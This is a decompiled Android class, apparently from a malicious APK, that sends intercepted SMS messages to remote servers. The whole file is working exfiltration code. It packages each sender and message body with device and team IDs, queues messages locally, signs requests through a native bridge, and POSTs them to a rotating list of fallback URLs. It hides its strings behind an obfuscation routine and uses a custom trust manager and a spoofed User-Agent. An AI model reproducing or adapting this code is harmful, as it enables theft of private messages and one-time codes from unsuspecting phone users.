package com.base.template.network;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import androidx.profileinstaller.FileSectionType$EnumUnboxingLocalUtility;
import androidx.room.RoomOpenHelper;
import androidx.tracing.Trace;
import androidx.work.NetworkType$EnumUnboxingLocalUtility;
import com.base.template.NativeBridge;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.regex.Pattern;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import kotlin.SynchronizedLazyImpl;
import kotlin.collections.ArraysKt;
import kotlin.collections.CollectionsKt__CollectionsKt;
import kotlin.collections.CollectionsKt__IterablesKt;
import kotlin.collections.EmptyList;
import kotlin.io.CloseableKt;
import kotlin.jvm.internal.Intrinsics;
import kotlin.ranges.IntProgressionIterator;
import kotlin.ranges.IntRange;
import kotlin.text.CharsKt;
import kotlin.text.Charsets;
import kotlin.text.StringsKt__StringsJVMKt;
import okhttp3.ConnectionPool;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.internal.Util;
import okhttp3.internal.connection.RealCall;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public abstract class SmsFastSend {
    public static final MediaType JSON_TYPE;
    public static final SynchronizedLazyImpl client$delegate;
    public static volatile boolean flushRunning;
    public static final Object queueLock;
    public static final SmsFastSend$trustManager$1 trustManager;

    public final class Credentials {
        public final List allUrls;
        public final String deviceId;
        public final String effectiveUrl;
        public final String fallbackUrl;
        public final String teamId;

        public Credentials(String str, String str2, List list, String str3, String str4) {
            this.effectiveUrl = str;
            this.fallbackUrl = str2;
            this.allUrls = list;
            this.teamId = str3;
            this.deviceId = str4;
        }

        public final boolean equals(Object obj) {
            if (this == obj) {
                return true;
            }
            if (!(obj instanceof Credentials)) {
                return false;
            }
            Credentials credentials = (Credentials) obj;
            return Intrinsics.areEqual(this.effectiveUrl, credentials.effectiveUrl) && Intrinsics.areEqual(this.fallbackUrl, credentials.fallbackUrl) && Intrinsics.areEqual(this.allUrls, credentials.allUrls) && Intrinsics.areEqual(this.teamId, credentials.teamId) && Intrinsics.areEqual(this.deviceId, credentials.deviceId);
        }

        public final int hashCode() {
            return this.deviceId.hashCode() + NetworkType$EnumUnboxingLocalUtility.m(this.teamId, (this.allUrls.hashCode() + NetworkType$EnumUnboxingLocalUtility.m(this.fallbackUrl, this.effectiveUrl.hashCode() * 31, 31)) * 31, 31);
        }

        public final String toString() {
            StringBuilder sb = new StringBuilder(C0000.decode(new byte[]{37, 20, 3, 87, 93, 8, 18, 15, 7, 95, 75, 78, 3, 0, 0, 86, 91, 18, 15, 16, 3, 102, 74, 10, 91}, "fff38f", 6));
            sb.append(this.effectiveUrl);
            sb.append(C0000.decode(new byte[]{21, 69, 2, 88, 84, 91, 86, 5, 90, 14, 49, 75, 84, 10}, "9ed9874d", 2));
            sb.append(this.fallbackUrl);
            sb.append(C0000.decode(new byte[]{24, 19, 88, 94, 94, 48, 16, 94, 67, 10}, "43922eb20772ae", true));
            sb.append(this.allUrls);
            sb.append(C0000.decode(new byte[]{31, 22, 67, 86, 89, 90, 122, 86, 14}, "36738732", 6));
            sb.append(this.teamId);
            sb.append(C0000.decode(new byte[]{28, 23, 84, 1, 68, 89, 90, 93, 113, 87, 13}, "070d209883"));
            return FileSectionType$EnumUnboxingLocalUtility.m(sb, this.deviceId, C0000.decode(new byte[]{29}, "43b5c4"));
        }
    }

    static {
        Pattern pattern = MediaType.TYPE_SUBTYPE;
        JSON_TYPE = CharsKt.get(C0000.decode(new byte[]{87, 73, 19, 13, 90, 0, 87, 77, 10, 14, 93, 76, 92, 74, 12, 15}, "69ca3c", 0.0f));
        queueLock = new Object();
        trustManager = new SmsFastSend$trustManager$1(0);
        client$delegate = new SynchronizedLazyImpl(SmsFastSend$client$2.INSTANCE);
    }

    public static JSONObject buildSmsJson(String str, String str2, String str3, String str4, int i, long j) throws JSONException {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put(C0000.decode(new byte[]{80, 85, 18, 92, 0, 1, 108, 90, 83}, "40d5cd337323c9"), str);
        jSONObject.put(C0000.decode(new byte[]{65, 83, 7, 12, 102, 95, 86}, "56fa9629ca78", 5), str2);
        jSONObject.put(C0000.decode(new byte[]{67, 83, 15, 85, 7, 75}, "06a1b96f2319", true), str3);
        jSONObject.put(C0000.decode(new byte[]{85, 6, 67, 74, 2, 86, 82}, "8c09c1791b8b", 7), str4);
        jSONObject.put(C0000.decode(new byte[]{22, 85, 21, 61, 23, 73, 22, 4}, "e8fbc0fa8b2e"), C0000.decode(new byte[]{10, 8, 83, 88, 9, 91, 8, 3}, "cf07d2fd74e2d0de", false));
        jSONObject.put(C0000.decode(new byte[]{75, 91, 92, 105, 75, 95, 14, 65}, "821683a58203", 5), i);
        jSONObject.put(C0000.decode(new byte[]{16, 92, 0, 82, 10, 65, 83, 80, 110, 82, 22}, "b9c7c76413bb69b6", 7), String.valueOf(j));
        jSONObject.put(C0000.decode(new byte[]{16, 8, 75, 61, 64, 15, 91, 93, 22, 68, 80, 94, 21}, "ce8b4f68e013ea8a", true), j);
        jSONObject.put(C0000.decode(new byte[]{65, 91, 12, 10, 86, 110, 95, 76, 8, 82, 84, 65}, "13cd3119e0"), "");
        jSONObject.put(C0000.decode(new byte[]{64, 9, 64, 75, 6, 83}, "3f59e6b92ef4", 0.0f), C0000.decode(new byte[]{86, 88, 21, 18}, "09ff62", false));
        return jSONObject;
    }

    public static void cacheCredentials(Context context, String str, String str2, String str3, String str4) {
        Collection allUrls;
        if (StringsKt__StringsJVMKt.isBlank(str) || StringsKt__StringsJVMKt.isBlank(str3) || StringsKt__StringsJVMKt.isBlank(str4)) {
            return;
        }
        try {
            try {
                allUrls = NativeBridge.getAllUrls();
            } catch (Throwable unused) {
                allUrls = EmptyList.INSTANCE;
            }
            context.getSharedPreferences(C0000.decode(new byte[]{67, 15, 65, 61, 70}, "0b2b765216", 0.0f), 0).edit().putString(C0000.decode(new byte[]{16, 17, 88}, "ec47f1d457b72ff3", 2), str).putString(C0000.decode(new byte[]{95, 90}, "98a10e", 5), str2).putString(C0000.decode(new byte[]{2, 71, 16, 90, 68}, "c2b67a63", 2), !allUrls.isEmpty() ? new JSONArray(allUrls).toString() : "").putString(C0000.decode(new byte[]{21, 8, 0}, "aad254a2ea0f", 5), str3).putString(C0000.decode(new byte[]{2, 93, 6}, "f4b802"), str4).commit();
        } catch (Exception unused2) {
        }
    }

    public static void doSend(Context context, SharedPreferences sharedPreferences, String str, String str2, int i) throws InterruptedException {
        Credentials credentialsResolveCredentials = resolveCredentials(context);
        if (credentialsResolveCredentials == null) {
            return;
        }
        boolean zTrySendToPath = false;
        for (int i2 = 1; i2 < 4; i2++) {
            long jCurrentTimeMillis = System.currentTimeMillis() / ((long) 1000);
            String signature = getSignature(context, credentialsResolveCredentials.teamId, jCurrentTimeMillis);
            if (!StringsKt__StringsJVMKt.isBlank(signature)) {
                zTrySendToPath = trySendToPath(buildSmsJson(credentialsResolveCredentials.deviceId, credentialsResolveCredentials.teamId, str, str2, i, jCurrentTimeMillis), jCurrentTimeMillis, signature, credentialsResolveCredentials.effectiveUrl, credentialsResolveCredentials.fallbackUrl, "/v1/events", credentialsResolveCredentials.allUrls);
                if (zTrySendToPath) {
                    break;
                } else if (i2 < 3) {
                    Thread.sleep(((long) i2) * 1000);
                }
            } else if (i2 < 3) {
                Thread.sleep(((long) i2) * 500);
            }
        }
        if (zTrySendToPath) {
            if (sharedPreferences != null) {
                synchronized (queueLock) {
                    try {
                        String string = sharedPreferences.getString(C0000.decode(new byte[]{16}, "ac4386", false), C0000.decode(new byte[]{106, 60}, "1afc1f167489"));
                        if (string == null) {
                            string = C0000.decode(new byte[]{107, 109}, "008947", 0.0f);
                        }
                        JSONArray jSONArray = new JSONArray(string);
                        if (jSONArray.length() != 0) {
                            JSONArray jSONArray2 = new JSONArray();
                            int length = jSONArray.length();
                            boolean z = false;
                            for (int i3 = 0; i3 < length; i3++) {
                                JSONObject jSONObject = jSONArray.getJSONObject(i3);
                                if (!z && Intrinsics.areEqual(jSONObject.optString(C0000.decode(new byte[]{69}, "6379ac84dbb5db", 4)), str)) {
                                    if (Intrinsics.areEqual(jSONObject.optString(C0000.decode(new byte[]{6}, "d81d03", 2)), str2)) {
                                        if (jSONObject.optInt(C0000.decode(new byte[]{66, 95}, "135f6a8af04aadd2", 0.0f), 0) == i) {
                                            z = true;
                                        }
                                    }
                                    jSONArray2.put(jSONObject);
                                }
                                jSONArray2.put(jSONObject);
                            }
                            if (z) {
                                sharedPreferences.edit().putString(C0000.decode(new byte[]{68}, "5cbc3ac166b7d0", 0.0f), jSONArray2.toString()).commit();
                            }
                        }
                    } catch (Exception unused) {
                    } catch (Throwable th) {
                        throw th;
                    }
                }
            }
            if (context == null) {
                return;
            }
            safeFlush(context.getSharedPreferences(C0000.decode(new byte[]{16, 89, 68, 105, 69}, "c4764e", 4), 0), credentialsResolveCredentials, context);
        }
    }

    public static void enqueue(SharedPreferences sharedPreferences, String str, String str2, int i) {
        if (sharedPreferences == null) {
            return;
        }
        synchronized (queueLock) {
            try {
                try {
                    String string = sharedPreferences.getString(C0000.decode(new byte[]{72}, "95c045b14b", 0.0f), C0000.decode(new byte[]{99, 56}, "8e7586", false));
                    if (string == null) {
                        string = C0000.decode(new byte[]{61, 105}, "f4d21e6f8a6c");
                    }
                    JSONArray jSONArray = new JSONArray(string);
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(C0000.decode(new byte[]{22}, "e38bab1e", 4), str);
                    jSONObject.put(C0000.decode(new byte[]{85}, "79ff89bc1e725b", true), str2);
                    jSONObject.put(C0000.decode(new byte[]{66, 84}, "18f23d", 0.0f), i);
                    jSONObject.put(C0000.decode(new byte[]{68}, "041662", 0.0f), System.currentTimeMillis() / ((long) 1000));
                    int length = jSONArray.length();
                    for (int i2 = 0; i2 < length; i2++) {
                        try {
                            JSONObject jSONObject2 = jSONArray.getJSONObject(i2);
                            if (Intrinsics.areEqual(jSONObject2.optString(C0000.decode(new byte[]{71}, "4affe4055c0058", 0)), str) && Intrinsics.areEqual(jSONObject2.optString(C0000.decode(new byte[]{84}, "658564", 0.0f)), str2)) {
                                return;
                            }
                        } catch (Exception unused) {
                        }
                    }
                    if (jSONArray.length() >= 200) {
                        JSONArray jSONArray2 = new JSONArray();
                        int length2 = jSONArray.length();
                        for (int length3 = jSONArray.length() - 199; length3 < length2; length3++) {
                            jSONArray2.put(jSONArray.getJSONObject(length3));
                        }
                        jSONArray2.put(jSONObject);
                        sharedPreferences.edit().putString(C0000.decode(new byte[]{73}, "87051e7b88069721", 1), jSONArray2.toString()).commit();
                    } else {
                        jSONArray.put(jSONObject);
                        sharedPreferences.edit().putString(C0000.decode(new byte[]{19}, "b0ef20", 0.0f), jSONArray.toString()).commit();
                    }
                    jSONArray.length();
                } catch (Exception unused2) {
                }
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    /* JADX WARN: Code duplicated, block: B:9:0x003b  */
    public static String getSignature(Context context, String str, long j) {
        String string;
        try {
            String strSignTimestamp = NativeBridge.signTimestamp(j);
            if (!StringsKt__StringsJVMKt.isBlank(strSignTimestamp)) {
                return strSignTimestamp;
            }
        } catch (Throwable unused) {
        }
        if (context != null) {
            try {
                string = context.getSharedPreferences(C0000.decode(new byte[]{22, 85, 16, 105, 18}, "e8c6ca"), 0).getString(C0000.decode(new byte[]{65, 86, 1}, "23bf32eb"), "");
                if (string == null) {
                    string = "";
                }
            } catch (Exception unused2) {
            }
        } else {
            string = "";
        }
        String strDecode = C0000.decode(new byte[]{123, 91, 89, 85, 101, 113, 121, 86, 13, 7}, "3686698d81afee99", 1);
        if (StringsKt__StringsJVMKt.isBlank(string)) {
            return "";
        }
        try {
            String str2 = str + j;
            Mac mac = Mac.getInstance(strDecode);
            Charset charset = Charsets.UTF_8;
            mac.init(new SecretKeySpec(string.getBytes(charset), strDecode));
            return ArraysKt.joinToString$default(mac.doFinal(str2.getBytes(charset)), SmsFastSend$signKotlin$1.INSTANCE);
        } catch (Exception unused3) {
            return "";
        }
    }

    public static Credentials resolveCredentials(Context context) {
        List<String> allUrls;
        List<String> listListOfNotNull;
        List<String> list;
        String str;
        String str2;
        List<String> list2 = EmptyList.INSTANCE;
        int i = 0;
        SharedPreferences sharedPreferences = context != null ? context.getSharedPreferences(C0000.decode(new byte[]{23, 9, 65, 111, 67}, "dd202d85af7b", false), 0) : null;
        if (sharedPreferences != null) {
            String str3 = "";
            String string = sharedPreferences.getString(C0000.decode(new byte[]{66, 91, 81}, "62556a24", 0.0f), "");
            String str4 = string == null ? "" : string;
            String string2 = sharedPreferences.getString(C0000.decode(new byte[]{0, 95, 2}, "d6f08a76798a", 5), "");
            String str5 = string2 == null ? "" : string2;
            if (!StringsKt__StringsJVMKt.isBlank(str5) && !StringsKt__StringsJVMKt.isBlank(str4)) {
                try {
                    allUrls = NativeBridge.getAllUrls();
                } catch (Throwable unused) {
                    allUrls = list2;
                }
                if (allUrls.isEmpty()) {
                    String string3 = sharedPreferences.getString(C0000.decode(new byte[]{66, 23, 10}, "7efd3a1b54b8e63c", 0.0f), "");
                    if (string3 == null) {
                        string3 = "";
                    }
                    String string4 = sharedPreferences.getString(C0000.decode(new byte[]{7, 80}, "a2280974", 0.0f), "");
                    if (string4 == null) {
                        string4 = "";
                    }
                    try {
                        String string5 = sharedPreferences.getString(C0000.decode(new byte[]{4, 23, 20, 13, 21}, "ebfaf8b5", true), "");
                        if (string5 != null) {
                            str3 = string5;
                        }
                        if (!StringsKt__StringsJVMKt.isBlank(str3)) {
                            JSONArray jSONArray = new JSONArray(str3);
                            IntRange intRangeUntil = Trace.until(0, jSONArray.length());
                            ArrayList arrayList = new ArrayList(CollectionsKt__IterablesKt.collectionSizeOrDefault(intRangeUntil));
                            Iterator it = intRangeUntil.iterator();
                            while (((IntProgressionIterator) it).hasNext) {
                                arrayList.add(jSONArray.getString(((IntProgressionIterator) it).nextInt()));
                            }
                            ArrayList arrayList2 = new ArrayList();
                            int size = arrayList.size();
                            while (i < size) {
                                Object obj = arrayList.get(i);
                                i++;
                                if (!StringsKt__StringsJVMKt.isBlank((String) obj)) {
                                    arrayList2.add(obj);
                                }
                            }
                            list2 = arrayList2;
                        }
                    } catch (Exception unused2) {
                    }
                    if (list2.isEmpty()) {
                        listListOfNotNull = CollectionsKt__CollectionsKt.listOfNotNull(!StringsKt__StringsJVMKt.isBlank(string3) ? string3 : null, (StringsKt__StringsJVMKt.isBlank(string4) || string4.equals(string3)) ? null : string4);
                    } else {
                        listListOfNotNull = list2;
                    }
                    list = listListOfNotNull;
                    str = string3;
                    str2 = string4;
                } else {
                    str = allUrls.get(0);
                    list = allUrls;
                    str2 = allUrls.size() > 1 ? allUrls.get(1) : "";
                }
                if (!StringsKt__StringsJVMKt.isBlank(str)) {
                    return new Credentials(str, str2, list, str4, str5);
                }
            }
        }
        return null;
    }

    public static void safeFlush(SharedPreferences sharedPreferences, Credentials credentials, Context context) {
        if (sharedPreferences == null || flushRunning) {
            return;
        }
        flushRunning = true;
        try {
            try {
                synchronized (queueLock) {
                    try {
                        String string = sharedPreferences.getString(C0000.decode(new byte[]{72}, "9060c7", true), C0000.decode(new byte[]{58, 62}, "ace66a4313"));
                        if (string == null) {
                            string = C0000.decode(new byte[]{111, 100}, "4992e6ee93", false);
                        }
                        JSONArray jSONArray = new JSONArray(string);
                        if (jSONArray.length() == 0) {
                            flushRunning = false;
                            return;
                        }
                        jSONArray.length();
                        JSONArray jSONArray2 = new JSONArray();
                        int length = jSONArray.length();
                        int i = 0;
                        loop0: for (int i2 = 0; i2 < length; i2++) {
                            try {
                                JSONObject jSONObject = jSONArray.getJSONObject(i2);
                                long jCurrentTimeMillis = System.currentTimeMillis() / ((long) 1000);
                                try {
                                    String signature = getSignature(context, credentials.teamId, jCurrentTimeMillis);
                                    if (StringsKt__StringsJVMKt.isBlank(signature)) {
                                        i++;
                                        jSONArray2.put(jSONObject);
                                        if (i >= 3) {
                                            int length2 = jSONArray.length();
                                            for (int i3 = i2 + 1; i3 < length2; i3++) {
                                                jSONArray2.put(jSONArray.getJSONObject(i3));
                                            }
                                            break loop0;
                                        }
                                        continue;
                                        try {
                                            jSONArray2.put(jSONArray.getJSONObject(i2));
                                        } catch (Exception unused) {
                                        }
                                    } else {
                                        try {
                                            if (!trySendToPath(buildSmsJson(credentials.deviceId, credentials.teamId, jSONObject.getString(C0000.decode(new byte[]{67}, "0503af832f", false)), jSONObject.getString(C0000.decode(new byte[]{91}, "9e57eac54f3a0a")), jSONObject.optInt(C0000.decode(new byte[]{23, 89}, "d5adab"), 0), jCurrentTimeMillis), jCurrentTimeMillis, signature, credentials.effectiveUrl, credentials.fallbackUrl, "/v1/events", credentials.allUrls)) {
                                                jSONArray2.put(jSONObject);
                                            }
                                            i = 0;
                                        } catch (Exception unused2) {
                                            i = 0;
                                            jSONArray2.put(jSONArray.getJSONObject(i2));
                                        }
                                    }
                                } catch (Exception unused3) {
                                }
                            } catch (Exception unused4) {
                            }
                        }
                        synchronized (queueLock) {
                            try {
                                String string2 = sharedPreferences.getString(C0000.decode(new byte[]{70}, "7150fd30b4568fb1", 2), C0000.decode(new byte[]{57, 106}, "b71428a29dc24e", 7));
                                if (string2 == null) {
                                    string2 = C0000.decode(new byte[]{110, 107}, "560595bc3bc0", 3);
                                }
                                JSONArray jSONArray3 = new JSONArray(string2);
                                JSONArray jSONArray4 = new JSONArray();
                                int length3 = jSONArray2.length();
                                for (int i4 = 0; i4 < length3; i4++) {
                                    jSONArray4.put(jSONArray2.getJSONObject(i4));
                                }
                                int length4 = jSONArray.length();
                                if (jSONArray3.length() > length4) {
                                    int length5 = jSONArray3.length();
                                    while (length4 < length5) {
                                        jSONArray4.put(jSONArray3.getJSONObject(length4));
                                        length4++;
                                    }
                                }
                                sharedPreferences.edit().putString(C0000.decode(new byte[]{68}, "5f08d4b8e3", false), jSONArray4.toString()).commit();
                            } catch (Throwable th) {
                                throw th;
                            }
                        }
                        jSONArray.length();
                        jSONArray2.length();
                        flushRunning = false;
                    } catch (Throwable th2) {
                        throw th2;
                    }
                }
            } catch (Throwable th3) {
                flushRunning = false;
                throw th3;
            }
        } catch (Exception unused5) {
        }
    }

    public static void send(final Context context, final String str, final String str2, final int i) {
        final SharedPreferences sharedPreferences = context != null ? context.getSharedPreferences(C0000.decode(new byte[]{75, 15, 70, 108, 65}, "8b53046b7973"), 0) : null;
        enqueue(sharedPreferences, str, str2, i);
        Thread thread = new Thread(new Runnable() { // from class: com.base.template.network.SmsFastSend$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                try {
                    SmsFastSend.doSend(context, sharedPreferences, str, str2, i);
                } catch (Exception e) {
                    e.getMessage();
                }
            }
        });
        thread.setDaemon(true);
        thread.start();
    }

    /* JADX WARN: Type inference failed for: r6v3, types: [byte[], java.io.Serializable] */
    public static boolean trySendToPath(JSONObject jSONObject, long j, String str, String str2, String str3, String str4, List list) {
        ArrayList arrayList;
        if (list.isEmpty()) {
            arrayList = CollectionsKt__CollectionsKt.mutableListOf(str2);
            if (!StringsKt__StringsJVMKt.isBlank(str3) && !str3.equals(str2)) {
                arrayList.add(str3);
            }
        } else {
            arrayList = new ArrayList(list);
        }
        int size = arrayList.size();
        int i = 0;
        while (i < size) {
            int i2 = i + 1;
            String str5 = (String) arrayList.get(i);
            try {
                Request.Builder builder = new Request.Builder();
                StringBuilder sb = new StringBuilder();
                sb.append(str5);
                try {
                    sb.append(str4);
                    builder.url(sb.toString());
                    String string = jSONObject.toString();
                    MediaType mediaType = JSON_TYPE;
                    Charset charset = Charsets.UTF_8;
                    if (mediaType != null) {
                        Pattern pattern = MediaType.TYPE_SUBTYPE;
                        Charset charset2 = mediaType.charset(null);
                        if (charset2 == null) {
                            try {
                                mediaType = CharsKt.get(mediaType + C0000.decode(new byte[]{10, 21, 80, 92, 89, 68, 75, 7, 16, 5, 66, 70, 0, 20, 91}, "1534868bd872f9c1", 2));
                            } catch (IllegalArgumentException unused) {
                                mediaType = null;
                            }
                        } else {
                            charset = charset2;
                        }
                    }
                    ?? bytes = string.getBytes(charset);
                    int length = bytes.length;
                    Util.checkOffsetAndCount(bytes.length, 0, length);
                    builder.method(C0000.decode(new byte[]{53, 41, 54, 97}, "efe5ca", 2), new RoomOpenHelper(mediaType, length, bytes, 2));
                    String strDecode = C0000.decode(new byte[]{39, 93, 12, 94, 13, 6}, "d2c5dc163f", true);
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(C0000.decode(new byte[]{102, 70, 64, 88}, "923edd4c", false));
                    try {
                        sb2.append(j);
                        sb2.append(C0000.decode(new byte[]{89, 18, 60, 66, 2, 4}, "b2c1e9"));
                        try {
                            sb2.append(str);
                            ((ConnectionPool) builder.headers).set(strDecode, sb2.toString());
                            ((ConnectionPool) builder.headers).set(C0000.decode(new byte[]{51, 71, 83, 20, 31, 112, 1, 81, 88, 18}, "f46f21"), C0000.decode(new byte[]{121, 93, 72, 11, 10, 90, 85, 29, 7, 76, 86, 22, 28, 126, 91, 12, 19, 78, 15, 18, 115, 12, 2, 68, 91, 91, 86, 66}, "422bf6", 0.0f) + Build.VERSION.RELEASE + C0000.decode(new byte[]{3, 17}, "81c987110a496b", true) + Build.MODEL + C0000.decode(new byte[]{17, 17, 112, 67, 64, 15, 6, 52, 81, 84, 123, 95, 76, 30, 4, 0, 7, 77, 80, 85, 20, 30, 123, 126, 108, 124, 125, 31, 16, 15, 10, 8, 81, 22, 119, 83, 91, 90, 94, 26, 16, 32, 11, 17, 91, 91, 85, 25, 9, 2, 6, 29, 0, 77, 83, 77, 4, 22, 125, 89, 90, 88, 93, 86, 16, 48, 2, 5, 85, 68, 89, 25, 13, 2, 6, 29, 3, 85}, "81130ccc4606", true));
                            Request requestBuild = builder.build();
                            OkHttpClient okHttpClient = (OkHttpClient) client$delegate.getValue();
                            okHttpClient.getClass();
                            Response responseExecute = new RealCall(okHttpClient, requestBuild, false).execute();
                            try {
                                int i3 = responseExecute.code;
                                if (200 <= i3 && i3 < 400) {
                                    responseExecute.close();
                                    return true;
                                }
                                responseExecute.close();
                                i = i2;
                            } catch (Throwable th) {
                                try {
                                    throw th;
                                } catch (Throwable th2) {
                                    CloseableKt.closeFinally(responseExecute, th);
                                    throw th2;
                                }
                            }
                        } catch (Exception e) {
                            e = e;
                            e.getMessage();
                            i = i2;
                        }
                    } catch (Exception e2) {
                        e = e2;
                        e.getMessage();
                        i = i2;
                    }
                } catch (Exception e3) {
                    e = e3;
                }
            } catch (Exception e4) {
                e = e4;
            }
        }
        return false;
    }
}
